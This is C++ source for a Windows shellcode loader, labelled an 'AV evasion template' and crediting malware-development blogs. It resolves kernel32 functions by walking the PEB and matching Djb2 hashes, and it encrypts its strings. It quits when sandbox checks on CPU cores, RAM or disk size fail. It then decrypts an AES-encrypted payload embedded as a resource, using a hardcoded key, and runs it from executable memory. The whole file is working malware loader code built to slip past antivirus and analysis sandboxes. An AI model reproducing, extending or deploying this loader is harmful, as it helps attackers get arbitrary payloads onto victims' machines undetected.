/*
AV EVASION TEMPLATE
Thanks to:
https://0xpat.github.io/Malware_development_part_2/
https://0xpat.github.io/Malware_development_part_4/
https://captmeelo.com/redteam/maldev/2021/12/15/lazy-maldev.html
*/

#include <iostream>
#include <windows.h>
#include <winternl.h>

#include "skc.hpp"

#include "include/aes.h"

// API hashing
typedef HRSRC(WINAPI* PFindResource)(HMODULE, LPCSTR, LPCSTR);
typedef DWORD(WINAPI* PSizeofResource)(HMODULE, HRSRC);
typedef PVOID(WINAPI* PLoadResource)(HMODULE, HRSRC);
typedef PVOID(WINAPI* PLockResource)(HGLOBAL);
typedef PVOID(WINAPI* PFreeResource)(HGLOBAL);
typedef PVOID(WINAPI* PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* PVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef PVOID(WINAPI* PGetSystemInfo)(LPSYSTEM_INFO);
typedef BOOL(WINAPI* PGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
typedef HANDLE(WINAPI* PCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* PDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);

// Djb2 hash function for API hashing
unsigned int HashDjb2(std::string str) {
    unsigned int hash = 9491;
    for (int c: str) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow) {

    // Get Kernel32
    PPEB pPEB = (PPEB) __readgsqword(0x60);
    PPEB_LDR_DATA pLoaderData = pPEB->Ldr;
    PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;
    PLIST_ENTRY listCurrent = listHead->Flink;
    PVOID kernel32Address;
    do {
        PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);
        PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
        WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);
        CharUpperA(dllName);
        if (strstr(dllName, SKCR("KERNEL32.DLL"))) {
            kernel32Address = dllEntry->DllBase;
            HeapFree(GetProcessHeap(), 0, dllName);
            break;
        }
        HeapFree(GetProcessHeap(), 0, dllName);
        listCurrent = listCurrent->Flink;
    } while (listCurrent != listHead);

    // API hashing
    PFindResource fFindResource;
    PSizeofResource fSizeofResource;
    PLoadResource fLoadResource;
    PLockResource fLockResource;
    PFreeResource fFreeResource;
    PVirtualAlloc fVirtualAlloc;
    PVirtualFree fVirtualFree;
    PGetSystemInfo fGetSystemInfo;
    PGlobalMemoryStatusEx fGlobalMemoryStatusEx;
    PCreateFileW fCreateFileW;
    PDeviceIoControl fDeviceIoControl;

    // Resolve functions
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER) kernel32Address;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS) ((PBYTE) kernel32Address + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) &(pNtHeader->OptionalHeader);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PULONG pAddressOfFunctions = (PULONG) ((PBYTE) kernel32Address + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG) ((PBYTE) kernel32Address + pExportDirectory->AddressOfNames);
    PUSHORT pAddressOfNameOrdinals = (PUSHORT) ((PBYTE) kernel32Address + pExportDirectory->AddressOfNameOrdinals);

    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i) {
        PCSTR pFunctionName = (PSTR) ((PBYTE) kernel32Address + pAddressOfNames[i]);
        if (HashDjb2(pFunctionName) == 0x7ff6a4a5) {
            fVirtualAlloc = (PVirtualAlloc) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x7d8d84fd) {
            fFindResource = (PFindResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x70dbb8eb) {
            fSizeofResource = (PSizeofResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x24a8ee5b) {
            fLoadResource = (PLoadResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x5c2527a4) {
            fLockResource = (PLockResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x13b1935d) {
            fFreeResource = (PFreeResource) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x49b4fa7c) {
            fVirtualFree = (PVirtualFree) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0xc42626c4) {
            fGetSystemInfo = (PGetSystemInfo) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x230fd4fe) {
            fGlobalMemoryStatusEx = (PGlobalMemoryStatusEx) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0xcebbf15e) {
            fCreateFileW = (PCreateFileW) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        } else if (HashDjb2(pFunctionName) == 0x2da631c) {
            fDeviceIoControl = (PDeviceIoControl) ((PBYTE) kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }

    // Quit if sandboxed

    // Check CPU > 2 cores
    SYSTEM_INFO si;
    fGetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 4) {
        return 0;
    }

    // Check RAM > 4GB
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    fGlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys / 1024 / 1024 < 4096) {
        return 0;
    }

    // Check HDD > 100GB
    HANDLE hDevice = fCreateFileW(SKCR(L"\\\\.\\PhysicalDrive0"), 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD dwBytes;
    fDeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &dwBytes, (LPOVERLAPPED) NULL);
    if (pDiskGeometry.Cylinders.QuadPart * (ULONG) pDiskGeometry.TracksPerCylinder * (ULONG) pDiskGeometry.SectorsPerTrack * (ULONG) pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024 < 100) {
        return 0;
    }

    // Load resource (the executable)
    HRSRC hResource = fFindResource(NULL, MAKEINTRESOURCE(101), SKCR("RT_RCDATA"));
    DWORD dwSize = fSizeofResource(NULL, hResource);
    HGLOBAL hResData = fLoadResource(NULL, hResource);
    LPVOID pData = fLockResource(hResData);
    std::vector<unsigned char> payload((unsigned char*) pData, (unsigned char*) (pData) + dwSize);
    fFreeResource(hResData);

    // Decrypt AES encrypted shellcode
    unsigned char* _key = (unsigned char*) SKCC("\x1A\xB2\xF8\xC5\x03\x7D\x9E\xA0\x6F\x84\x2D\xE7\x1B\x5C\x91\x6E");
    unsigned char* _iv = (unsigned char*) SKCC("\x8F\xD4\xE2\x70\xA9\xCB\xF5\x12\x63\x4E\x8A\xB7\x01\x9D\x3F\x56");
    std::vector<unsigned char> key(_key, _key + 16);
    std::vector<unsigned char> iv(_iv, _iv + 16);
    AES aes(AESKeyLength::AES_128);
    payload = aes.DecryptCBC(payload, key, iv);

    // Allocate memory
    void* lpMem = fVirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpMem, payload.data(), dwSize);

    // Execute shellcode
    ((void(*)()) lpMem)();

    // Cleanup
    fVirtualFree(lpMem, 0, MEM_RELEASE);
    return 0;
}